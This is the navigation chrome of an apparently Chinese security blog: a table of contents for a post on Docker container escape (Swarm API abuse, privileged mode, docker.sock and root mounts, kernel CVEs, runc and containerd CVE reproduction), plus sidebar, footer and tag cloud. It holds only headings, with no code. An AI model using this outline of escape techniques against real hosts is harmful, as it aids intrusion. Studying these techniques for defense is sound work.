href="#10-%E5%B0%9D%E8%AF%95%E8%AE%BF%E9%97%AE%E5%AE%BF%E4%B8%BB%E6%9C%BA%E8%B5%84%E6%BA%90"><span class="toc-number">1.1.10.</span> <span class="toc-text">10. 尝试访问宿主机资源</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%87%AA%E5%8A%A8%E5%8C%96%E6%A3%80%E6%B5%8B%E8%84%9A%E6%9C%AC%E7%A4%BA%E4%BE%8B"><span class="toc-number">1.1.11.</span> <span class="toc-text">自动化检测脚本示例</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9"><span class="toc-number">1.1.12.</span> <span class="toc-text">注意事项</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81Docker-Swarm-remote-api-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E9%80%83%E9%80%B8%E6%8A%80%E6%9C%AF"><span class="toc-number">1.2.</span> <span class="toc-text">一、Docker Swarm remote api 未授权访问逃逸技术</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">1.2.1.</span> <span class="toc-text">1. 漏洞原理</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Docker-Swarm-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.2.1.1.</span> <span class="toc-text">Docker Swarm 环境搭建</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B"><span class="toc-number">1.2.2.</span> <span class="toc-text">2. 漏洞检测</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">1.2.2.1.</span> <span class="toc-text">(1) 端口扫描</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-API-%E6%8E%A2%E6%B5%8B"><span class="toc-number">1.2.2.2.</span> <span class="toc-text">(2) API 探测</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-Docker-%E5%AE%A2%E6%88%B7%E7%AB%AF%E9%AA%8C%E8%AF%81"><span class="toc-number">1.2.2.3.</span> <span class="toc-text">(3) Docker 客户端验证</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">1.2.3.</span> <span class="toc-text">3. 漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%88%9B%E5%BB%BA%E7%89%B9%E6%9D%83%E5%AE%B9%E5%99%A8%E6%8C%82%E8%BD%BD%E5%AE%BF%E4%B8%BB%E6%9C%BA%E7%9B%AE%E5%BD%95"><span class="toc-number">1.2.3.1.</span> <span class="toc-text">(1) 创建特权容器挂载宿主机目录</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E7%9B%B4%E6%8E%A5%E6%93%8D%E4%BD%9C-Docker-API"><span class="toc-number">1.2.3.2.</span> <span class="toc-text">(2) 直接操作 Docker API</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E7%89%B9%E6%9D%83%E6%A8%A1%E5%BC%8F%EF%BC%88Privileged-Mode%EF%BC%89%E9%80%83%E9%80%B8"><span class="toc-number">1.3.</span> <span class="toc-text">二、特权模式（Privileged Mode）逃逸</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%89%B9%E6%9D%83%E6%A8%A1%E5%BC%8F%EF%BC%88Privileged-Mode%EF%BC%89%E9%80%83%E9%80%B8%E6%8A%80%E6%9C%AF%E8%AF%A6%E8%A7%A3"><span class="toc-number">1.3.1.</span> <span class="toc-text">特权模式（Privileged Mode）逃逸技术详解</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E7%89%B9%E6%9D%83%E6%A8%A1%E5%BC%8F%E7%9A%84%E5%AE%9A%E4%B9%89%E4%B8%8E%E4%BD%9C%E7%94%A8"><span class="toc-number">1.3.1.1.</span> <span class="toc-text">1. 特权模式的定义与作用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E9%80%83%E9%80%B8%E7%9A%84%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86"><span class="toc-number">1.3.1.2.</span> <span class="toc-text">2. 逃逸的核心原理</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%A3%80%E6%B5%8B%E6%98%AF%E5%90%A6%E5%A4%84%E4%BA%8E%E7%89%B9%E6%9D%83%E5%AE%B9%E5%99%A8"><span class="toc-number">1.3.2.</span> <span class="toc-text">3. 检测是否处于特权容器</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%A3%80%E6%9F%A5-Capabilities"><span class="toc-number">1.3.2.1.</span> <span class="toc-text">(1) 检查 Capabilities</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E6%9F%A5%E7%9C%8B%E6%8C%82%E8%BD%BD%E7%9A%84%E8%AE%BE%E5%A4%87"><span class="toc-number">1.3.2.2.</span> <span class="toc-text">(2) 查看挂载的设备</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E5%85%B8%E5%9E%8B%E5%88%A9%E7%94%A8%E6%AD%A5%E9%AA%A4%E4%B8%8E%E7%A4%BA%E4%BE%8B"><span class="toc-number">1.3.3.</span> <span class="toc-text">4. 典型利用步骤与示例</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%8C%82%E8%BD%BD%E5%AE%BF%E4%B8%BB%E6%9C%BA%E6%A0%B9%E7%9B%AE%E5%BD%95%E9%80%83%E9%80%B8"><span class="toc-number">1.3.3.1.</span> <span class="toc-text">(1) 挂载宿主机根目录逃逸</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E5%88%A9%E7%94%A8%E8%AE%BE%E5%A4%87%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99%E5%86%85%E5%AD%98"><span class="toc-number">1.3.3.2.</span> <span class="toc-text">(2) 利用设备文件读写内存</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%883%EF%BC%89%E6%89%80%E6%9C%89%E5%8F%AF%E4%BB%A5%E5%B0%9D%E8%AF%95%E7%9A%84%E6%96%B9%E5%BC%8F"><span class="toc-number">1.3.3.3.</span> <span class="toc-text">（3）所有可以尝试的方式</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E9%98%B2%E5%BE%A1%E6%8E%AA%E6%96%BD"><span class="toc-number">1.3.4.</span> <span class="toc-text">5. 防御措施</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E6%8C%82%E8%BD%BD%E5%AE%BF%E4%B8%BB%E6%9C%BA%E6%95%8F%E6%84%9F%E7%9B%AE%E5%BD%95"><span class="toc-number">1.4.</span> <span class="toc-text">三、挂载宿主机敏感目录</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8C%82%E8%BD%BD%E5%AE%BF%E4%B8%BB%E6%9C%BA%E6%95%8F%E6%84%9F%E7%9B%AE%E5%BD%95%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8%E6%8A%80%E6%9C%AF%E8%AF%A6%E8%A7%A3"><span class="toc-number">1.4.1.</span> <span class="toc-text">挂载宿主机敏感目录容器逃逸技术详解</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-1"><span class="toc-number">1.4.1.1.</span> <span class="toc-text">1. 漏洞原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E5%B8%B8%E8%A7%81%E6%95%8F%E6%84%9F%E7%9B%AE%E5%BD%95%E5%8F%8A%E6%94%BB%E5%87%BB%E5%9C%BA%E6%99%AF"><span class="toc-number">1.4.1.2.</span> <span class="toc-text">2. 常见敏感目录及攻击场景</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E6%94%BB%E5%87%BB%E6%AD%A5%E9%AA%A4%E4%B8%8E%E7%A4%BA%E4%BE%8B"><span class="toc-number">1.4.1.3.</span> <span class="toc-text">3. 攻击步骤与示例</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%9C%BA%E6%99%AF-1%EF%BC%9A%E6%8C%82%E8%BD%BD%E5%AE%BF%E4%B8%BB%E6%9C%BA%E6%A0%B9%E7%9B%AE%E5%BD%95%EF%BC%88-%EF%BC%89%E9%80%83%E9%80%B8"><span class="toc-number">1.4.1.3.1.</span> <span class="toc-text">场景 1：挂载宿主机根目录（&#x2F;）逃逸</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%9C%BA%E6%99%AF-2%EF%BC%9A%E6%8C%82%E8%BD%BD-Docker-Socket%EF%BC%88-var-run-docker-sock%EF%BC%89%E9%80%83%E9%80%B8"><span class="toc-number">1.4.1.3.2.</span> <span class="toc-text">场景 2：挂载 Docker Socket（&#x2F;var&#x2F;run&#x2F;docker.sock）逃逸</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%9C%BA%E6%99%AF-3%EF%BC%9A%E6%8C%82%E8%BD%BD-proc-%E7%9B%AE%E5%BD%95%E8%A7%A6%E5%8F%91%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="toc-number">1.4.1.3.3.</span> <span class="toc-text">场景 3：挂载 &#x2F;proc 目录触发代码执行</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E6%A3%80%E6%B5%8B%E5%AE%B9%E5%99%A8%E6%98%AF%E5%90%A6%E6%8C%82%E8%BD%BD%E6%95%8F%E6%84%9F%E7%9B%AE%E5%BD%95"><span class="toc-number">1.4.1.4.</span> <span class="toc-text">4. 检测容器是否挂载敏感目录</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-%E9%98%B2%E5%BE%A1%E6%8E%AA%E6%96%BD-1"><span class="toc-number">1.4.1.5.</span> <span class="toc-text">5. 防御措施</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-%E5%AE%9E%E9%99%85%E6%A1%88%E4%BE%8B"><span class="toc-number">1.4.1.6.</span> <span class="toc-text">6. 实际案例</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E9%80%83%E9%80%B8"><span class="toc-number">1.5.</span> <span class="toc-text">四、内核漏洞逃逸</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E9%80%83%E9%80%B8%E6%8A%80%E6%9C%AF%E8%AF%A6%E8%A7%A3"><span class="toc-number">1.5.1.</span> <span class="toc-text">内核漏洞逃逸技术详解</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E9%80%83%E9%80%B8%E5%8E%9F%E7%90%86"><span class="toc-number">1.5.1.1.</span> <span class="toc-text">1. 内核漏洞逃逸原理</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-number">1.5.2.</span> <span class="toc-text">2. 漏洞利用条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%85%B8%E5%9E%8B%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A8%E5%9C%BA%E6%99%AF"><span class="toc-number">1.5.3.</span> <span class="toc-text">3. 典型内核漏洞与利用场景</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-Dirty-COW%EF%BC%88CVE-2016-5195%EF%BC%89"><span class="toc-number">1.5.3.1.</span> <span class="toc-text">(1) Dirty COW（CVE-2016-5195）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-CVE-2022-0185%EF%BC%88%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E6%8C%82%E8%BD%BD%E9%80%83%E9%80%B8%EF%BC%89"><span class="toc-number">1.5.3.2.</span> <span class="toc-text">(2) CVE-2022-0185（文件系统挂载逃逸）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-CVE-2021-4034%EF%BC%88Polkit-%E6%8F%90%E6%9D%83%EF%BC%89"><span class="toc-number">1.5.3.3.</span> <span class="toc-text">(3) CVE-2021-4034（Polkit 提权）</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%B5%81%E7%A8%8B"><span class="toc-number">1.5.4.</span> <span class="toc-text">4. 漏洞利用流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E6%A3%80%E6%B5%8B%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.5.5.</span> <span class="toc-text">5. 检测内核漏洞</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94%E3%80%81%E5%85%B6%E4%BB%96CVE%E9%80%83%E9%80%B8%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.6.</span> <span class="toc-text">五、其他CVE逃逸漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E5%AE%B9%E5%99%A8%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.6.1.</span> <span class="toc-text">一、容器组件漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-runc-%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.6.1.1.</span> <span class="toc-text">1. runc 相关漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-BuildKit-%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%EF%BC%88Leaky-Vessels-%E7%B3%BB%E5%88%97%EF%BC%89"><span class="toc-number">1.6.1.2.</span> <span class="toc-text">2. BuildKit 相关漏洞（Leaky Vessels 系列）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-containerd-%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.6.1.3.</span> <span class="toc-text">3. containerd 相关漏洞</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E3%80%81CVE-2019-5736-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E6%B5%81%E7%A8%8B"><span class="toc-number">1.6.2.</span> <span class="toc-text">二、CVE-2019-5736 漏洞复现流程</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-2"><span class="toc-number">1.6.2.1.</span> <span class="toc-text">1. 漏洞原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%B5%81%E7%A8%8B"><span class="toc-number">1.6.2.2.</span> <span class="toc-text">2. 漏洞利用流程</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87"><span class="toc-number">1.6.2.2.1.</span> <span class="toc-text">(1) 环境准备</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E7%94%9F%E6%88%90-Payload"><span class="toc-number">1.6.2.2.2.</span> <span class="toc-text">(2) 生成 Payload</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-%E4%B8%8A%E4%BC%A0-Payload-%E8%87%B3%E5%AE%B9%E5%99%A8"><span class="toc-number">1.6.2.2.3.</span> <span class="toc-text">(3) 上传 Payload 至容器</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#4-%E6%89%A7%E8%A1%8C%E6%94%BB%E5%87%BB"><span class="toc-number">1.6.2.2.4.</span> <span class="toc-text">(4) 执行攻击</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#5-%E8%8E%B7%E5%8F%96%E5%AE%BF%E4%B8%BB%E6%9C%BA%E6%9D%83%E9%99%90"><span class="toc-number">1.6.2.2.5.</span> <span class="toc-text">(5) 获取宿主机权限</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E5%85%B3%E9%94%AE%E6%AD%A5%E9%AA%A4%E8%A7%A3%E6%9E%90"><span class="toc-number">1.6.2.3.</span> <span class="toc-text">3. 关键步骤解析</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89%E3%80%81CVE-2020-15257-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E6%B5%81%E7%A8%8B"><span class="toc-number">1.6.3.</span> <span class="toc-text">三、CVE-2020-15257 漏洞复现流程</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%BC%8F%E6%B4%9E%E8%83%8C%E6%99%AF%E4%B8%8E%E5%8E%9F%E7%90%86"><span class="toc-number">1.6.3.1.</span> <span class="toc-text">1. 漏洞背景与原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%B5%81%E7%A8%8B-1"><span class="toc-number">1.6.3.2.</span> <span class="toc-text">2. 漏洞利用流程</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A4-1%EF%BC%9A%E6%90%AD%E5%BB%BA%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83"><span class="toc-number">1.6.3.2.1.</span> <span class="toc-text">步骤 1：搭建漏洞环境</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A4-2%EF%BC%9A%E6%A3%80%E6%B5%8B%E6%BC%8F%E6%B4%9E%E5%AD%98%E5%9C%A8%E6%80%A7"><span class="toc-number">1.6.3.2.2.</span> <span class="toc-text">步骤 2：检测漏洞存在性</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%AD%A5%E9%AA%A4-3%EF%BC%9A%E5%88%A9%E7%94%A8%E6%BC%8F%E6%B4%9E%E9%80%83%E9%80%B8"><span class="toc-number">1.6.3.2.3.</span> <span class="toc-text">步骤 3：利用漏洞逃逸</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E7%BB%86%E8%8A%82"><span class="toc-number">1.6.3.3.</span> <span class="toc-text">3. 漏洞原理细节</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E5%AE%9E%E9%99%85%E5%BD%B1%E5%93%8D%E4%B8%8E%E6%A1%88%E4%BE%8B"><span class="toc-number">1.6.3.4.</span> <span class="toc-text">4. 实际影响与案例</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E6%80%BB%E7%BB%93%E4%B8%8E%E5%AF%B9%E6%AF%94"><span class="toc-number">1.6.4.</span> <span class="toc-text">四、总结与对比</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>最近发布</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/32372/" title="内网穿透技术"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/default_cover.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="内网穿透技术"/></a><div class="content"><a class="title" href="/posts/32372/" title="内网穿透技术">内网穿透技术</a><time datetime="2025-05-23T16:00:00.000Z" title="发表于 2025-05-24 00:00:00">2025-05-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/45333/" title="k8s云安全"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/Docker-Logo-1024x576.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="k8s云安全"/></a><div class="content"><a class="title" href="/posts/45333/" title="k8s云安全">k8s云安全</a><time datetime="2025-05-19T16:00:00.000Z" title="发表于 2025-05-20 00:00:00">2025-05-20</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/35958/" title="Docker Escape"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/Docker-Logo-1024x576.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Docker Escape"/></a><div class="content"><a class="title" href="/posts/35958/" title="Docker Escape">Docker Escape</a><time datetime="2025-05-10T16:00:00.000Z" title="发表于 2025-05-11 00:00:00">2025-05-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/5304/" title="域横向移动工具对比"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/default_cover.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="域横向移动工具对比"/></a><div class="content"><a class="title" href="/posts/5304/" title="域横向移动工具对比">域横向移动工具对比</a><time datetime="2025-05-03T16:00:00.000Z" title="发表于 2025-05-04 00:00:00">2025-05-04</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/64101/" title="Weblogic常见安全漏洞"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/oracle-weblogic.png?x-oss-process=style/img-to-webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Weblogic常见安全漏洞"/></a><div class="content"><a class="title" href="/posts/64101/" title="Weblogic常见安全漏洞">Weblogic常见安全漏洞</a><time datetime="2025-03-29T16:00:00.000Z" title="发表于 2025-03-30 00:00:00">2025-03-30</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div id="workboard"><img class="workSituationImg boardsign" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hongkong-img.oss-cn-hongkong.aliyuncs.com/blog-web-img/184064234.png" alt="网络安全行业初级从业者！~" title="网络安全行业初级从业者！~"/><div id="runtimeTextTip"></div></div></div><div id="footer-bar"><div class="footer-bar-links"><div class="footer-bar-left"><div id="footer-bar-tips"><div class="copyright">&copy;2022 - 2025 By <a class="footer-bar-link" href="/" title="Takake" target="_blank">Takake</a></div></div><div id="footer-type-tips"></div></div><div class="footer-bar-right"><a class="footer-bar-link" target="_blank" rel="noopener" href="https://github.com" title="GITHUB">GITHUB</a><a class="footer-bar-link" target="_blank" rel="noopener" href="https://chat.opengpt.lol" title="CHATGPT">CHATGPT</a></div></div></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">文章</div><div class="length-num">87</div></a><a href="/tags/" title="tag"><div class="headline">标签</div><div class="length-num">156</div></a><a href="/categories/" title="category"><div class="headline">分类</div><div class="length-num">12</div></a></div><span class="sidebar-menu-item-title">功能</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="显示模式"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>显示模式</span></a></div><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" href="https://blog.takake.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https:/api.opengpt.lol/" title="GPT-API"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="GPT-API"/><span class="back-menu-item-text">GPT-API</span></a></div></div></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><i class="anzhiyufont anzhiyu-icon-link faa-tada" style="font-size: 0.9em;"></i><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/comments/"><i class="anzhiyufont anzhiyu-icon-envelope faa-tada" style="font-size: 0.9em;"></i><span> 留言板</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><i class="anzhiyufont anzhiyu-icon-music faa-tada" style="font-size: 0.9em;"></i><span> 音乐馆</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/bangumis/"><i class="anzhiyufont anzhiyu-icon-bilibili faa-tada" style="font-size: 0.9em;"></i><span> 追番页</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><i class="anzhiyufont anzhiyu-icon-paper-plane faa-tada" style="font-size: 0.9em;"></i><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/essay/"><i class="anzhiyufont anzhiyu-icon-lightbulb faa-tada" style="font-size: 0.9em;"></i><span> 站点动态</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><i class="anzhiyufont anzhiyu-icon-shoe-prints1 faa-tada" style="font-size: 0.9em;"></i><span> 随便逛逛</span></a></li></ul></div></div><span class="sidebar-menu-item-title">标签</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/CVE/" style="font-size: 0.88rem;">CVE<sup>5</sup></a><a href="/tags/Chrome/" style="font-size: 0.88rem;">Chrome<sup>2</sup></a><a href="/tags/Docker/" style="font-size: 0.88rem;">Docker<sup>2</sup></a><a href="/tags/Fastjson/" style="font-size: 0.88rem;">Fastjson<sup>1</sup></a><a href="/tags/IPV6/" style="font-size: 0.88rem;">IPV6<sup>1</sup></a><a href="/tags/JSON%E6%B3%A8%E5%85%A5/" style="font-size: 0.88rem;">JSON注入<sup>1</sup></a><a href="/tags/JS%E9%80%86%E5%90%91/" style="font-size: 0.88rem;">JS逆向<sup>2</sup></a><a href="/tags/NAS/" style="font-size: 0.88rem;">NAS<sup>3</sup></a><a href="/tags/NTLM/" style="font-size: 0.88rem;">NTLM<sup>2</sup></a><a href="/tags/PHP/" style="font-size: 0.88rem;">PHP<sup>2</sup></a><a href="/tags/RCE/" style="font-size: 0.88rem;">RCE<sup>18</sup></a><a href="/tags/TLS/" style="font-size: 0.88rem;">TLS<sup>1</sup></a><a href="/tags/cisp/" style="font-size: 0.88rem;">cisp<sup>2</sup></a><a href="/tags/esxi/" style="font-size: 0.88rem;">esxi<sup>1</sup></a><a href="/tags/html/" style="font-size: 0.88rem;">html<sup>1</sup></a><a href="/tags/javascript/" style="font-size: 0.88rem;">javascript<sup>1</sup></a><a href="/tags/kerberos/" style="font-size: 0.88rem;">kerberos<sup>1</sup></a><a href="/tags/nas/" style="font-size: 0.88rem;">nas<sup>1</sup></a><a 